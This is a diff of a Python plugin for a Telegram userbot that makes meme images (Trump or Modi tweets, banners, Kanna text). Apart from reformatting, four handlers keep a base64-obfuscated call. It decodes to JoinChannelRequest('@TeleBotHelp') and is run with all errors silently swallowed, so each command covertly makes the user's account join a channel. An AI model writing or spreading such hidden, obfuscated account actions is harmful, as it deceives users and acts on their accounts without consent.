@@ -6,13 +6,12 @@
 
 import re
 
+import pybase64
 import requests
 from PIL import Image
 from validators.url import url
 
 from telebot import CMD_HELP
-from telethon.tl.functions.channels import JoinChannelRequest
-import pybase64
 
 EMOJI_PATTERN = re.compile(
     "["
@@ -130,7 +129,9 @@ async def nekobot(event):
             return
     await eor(event, "Requesting trump to tweet...")
     try:
-        isee = str(pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ=="))[2:49]
+        isee = str(
+            pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
+        )[2:49]
         await telebot(isee)
     except BaseException:
         pass
@@ -159,7 +160,9 @@ async def nekobot(event):
             return
     await eor(event, "Requesting modi to tweet...")
     try:
-        isee = str(pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ=="))[2:49]
+        isee = str(
+            pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
+        )[2:49]
         await telebot(isee)
     except BaseException:
         pass
@@ -188,7 +191,9 @@ async def nekobot(event):
             return
     await eor(event, "Your banner is under construction, wait a sec...")
     try:
-        isee = str(pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ=="))[2:49]
+        isee = str(
+            pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
+        )[2:49]
         await telebot(isee)
     except BaseException:
         pass
@@ -217,7 +222,9 @@ async def nekobot(event):
             return
     await eor(event, "Kanna is writing your text...")
     try:
-        isee = str(pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ=="))[2:49]
+        isee = str(
+            pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
+        )[2:49]
         await telebot(isee)
     except BaseException:
         pass
